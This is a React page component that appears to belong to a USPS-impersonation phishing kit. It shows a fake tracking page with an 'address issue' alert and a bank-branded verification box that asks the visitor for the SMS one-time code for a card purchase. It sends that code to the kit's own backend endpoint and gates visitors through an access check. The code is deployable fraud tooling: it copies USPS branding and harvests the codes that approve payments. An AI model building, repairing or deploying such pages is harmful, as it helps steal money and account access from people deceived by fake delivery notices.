import React, { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import axios from "axios";
import Header from "../components/Header";
import Footer from "../components/Footer";
import { baseUrl } from "../constants";
import useAccessCheck from "../Utils/useAccessCheck";

const PaymentOTP: React.FC = () => {
  const inputClass =
    "w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]";

  const statusSegments = [
    { id: 1, gradient: "linear-gradient(90deg, #2b2a72 0%, #1f1f5a 100%)" },
    { id: 2, color: "#d9d9df" },
    { id: 3, color: "#d9d9df" },
    { id: 4, color: "#d9d9df" },
  ];

  const navigate = useNavigate();
  const location = useLocation();
  const { sessionId } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError("");

    if (!sessionId) {
      setError("Session expired. Please restart the process.");
      return;
    }

    if (!/^[0-9]{6}$/.test(otp)) {
      setError("Please enter the 6-digit code sent to your phone.");
      return;
    }

    setIsLoading(true);

    try {
      await axios.post(`${baseUrl}api/usps-payment-otp/`, {
        sessionId,
        otp,
      });

      navigate("/success", { state: { sessionId } });
    } catch (err) {
      console.error("Error submitting OTP:", err);
      setError("There was a problem verifying your code. Please try again.");
      setIsLoading(false);
    }
  };

  if (isAllowed === null) {
    return <div>Loading...</div>;
  }

  if (isAllowed === false) {
    return <div>Access denied. Redirecting...</div>;
  }

  if (!sessionId) {
    return <div>Missing session information. Please restart the process.</div>;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
      <Header />
      <main className="flex-1 w-full">
        <div className="w-full bg-white border-b border-[#e0e0e8] py-10 px-4 sm:px-6 shadow-sm">
          <div className="max-w-[960px] mx-auto flex flex-wrap items-start justify-between gap-6">
            <div>
              <div className="text-[26px] sm:text-[30px] font-semibold text-[#1a2252] leading-tight">
                USPS Tracking<sup className="text-xs align-super">®</sup>
              </div>
              <button
                type="button"
                className="mt-3 inline-flex items-center gap-2 sm:gap-3 text-[14px] sm:text-[15px] font-semibold text-[#1a2252] hover:underline"
              >
                <span>Track Another Package</span>
                <span className="text-[#d52b1e] text-[18px] sm:text-[22px] leading-none">+</span>
              </button>
            </div>
            <div className="flex items-center gap-4 sm:gap-5 text-[14px] sm:text-[15px] font-semibold text-[#1a2252]">
              <button
                type="button"
                className="relative px-1 pb-1 text-[#1a2252] after:absolute after:left-0 after:right-0 after:bottom-0 after:h-[2px] after:bg-[#d52b1e]"
              >
                Tracking
              </button>
              <span className="h-5 w-px bg-[#d8d8e0]" />
              <button
                type="button"
                className="px-1 pb-1 text-[#4a4f6d] hover:text-[#1a2252] transition-colors"
              >
                FAQs
              </button>
            </div>
          </div>
        </div>
        <div className="w-full max-w-[960px] mx-auto px-4 sm:px-6 pb-16">
          <div className="mt-12 space-y-12">
            <section className="space-y-5">
              <div className="text-[16px] sm:text-[17px] text-[#4a4f6d]">
                <span className="font-semibold text-[#1a2252]">Tracking Number:</span>
                <span className="ml-1 sm:ml-2 font-semibold text-[16px] sm:text-[17px] text-[#6b6f88]">92612999897543581074711582</span>
              </div>
              <div className="text-[17px] font-semibold text-[#23285a]">Status :</div>
              <div className="text-[19px] font-bold text-[#c5282c]">
                We have issues with your shipping address
              </div>
              <div className="text-[14px] leading-6 text-[#4a4f6d] max-w-[620px]">
                USPS allows you to Redeliver your package to your address in case of
                delivery failure or any other case. You can also track the package at
                any time, from shipment to delivery.
              </div>
              <div className="mt-4 flex w-full max-w-[760px]">
                {statusSegments.map((segment, index) => (
                  <div
                    key={segment.id}
                    className="h-[14px]"
                    style={{
                      flexGrow: index === 0 ? 1.6 : 1,
                      flexBasis: 0,
                      background: segment.gradient || segment.color,
                      clipPath:
                        index === statusSegments.length - 1
                          ? "polygon(8px 0, 100% 0, 100% 100%, 0 100%)"
                          : "polygon(8px 0, 100% 0, calc(100% - 8px) 100%, 0 100%)",
                      marginRight: index === statusSegments.length - 1 ? 0 : 4,
                    }}
                  />
                ))}
              </div>
              <div className="text-[13px] font-semibold text-[#c5282c] uppercase tracking-wide">
                Status Not Available
              </div>
            </section>
            <section>
              <div className="text-[17px] font-semibold text-[#23285a] mb-5 text-center">Please enter your security code or OTP</div>
              <div className="max-w-[420px] mx-auto bg-white border border-[#d8d8e0] shadow-sm rounded-md px-6 py-8 space-y-5">
                <div className="flex items-center justify-between">
                  <img
                    src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png"
                    alt="Visa"
                    className="h-5 object-contain"
                  />
                  <img
                    src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg"
                    alt="Mastercard"
                    className="h-5 object-contain"
                  />
                  <img
                    src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg"
                    alt="USPS"
                    className="h-6 object-contain"
                  />
                </div>
                <p className="text-[13px] leading-6 text-center text-[#4a4f6d]">
                  Authentication is required for this purchase. Please type the OTP code sent to your registered mobile ***-***-2423.
                </p>
                <div className="space-y-1 text-[13px] text-[#1a2252]">
                  <div className="flex justify-between">
                    <span className="font-semibold">Bank:</span>
                    <span>Chase Bank</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="font-semibold">Date:</span>
                    <span>10/25/2025 06:42 PM</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="font-semibold">Card:</span>
                    <span>XXXX XXXX XX23 2345</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="font-semibold">Full Name:</span>
                    <span>Jeff Clifford</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="font-semibold">OTP sent to:</span>
                    <span>***-***-2423</span>
                  </div>
                </div>
                <form className="space-y-3" onSubmit={handleSubmit}>
                  <div>
                    <label className="block text-[12px] text-[#1a2252] font-semibold mb-1" htmlFor="sms-code">
                      SMS code
                    </label>
                    <input
                      id="sms-code"
                      type="text"
                      className={inputClass}
                      placeholder="6-digit code"
                      pattern="\d{6}"
                      value={otp}
                      onChange={(e) =>
                        setOtp(e.target.value.replace(/[^0-9]/g, "").slice(0, 6))
                      }
                      required
                    />
                  </div>
                  {error && (
                    <p className="text-sm text-red-600 font-semibold">{error}</p>
                  )}
                  <button
                    type="submit"
                    className="mt-4 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-10 py-3 text-[15px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors w-full disabled:opacity-60 disabled:cursor-not-allowed"
                    disabled={isLoading}
                  >
                    {isLoading ? "Verifying..." : "Submit"}
                  </button>
                </form>
                <p className="text-center text-[11px] text-[#6b6f88]">Copyright © 1999-2025 USPS. All rights reserved.</p>
              </div>
            </section>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default PaymentOTP;
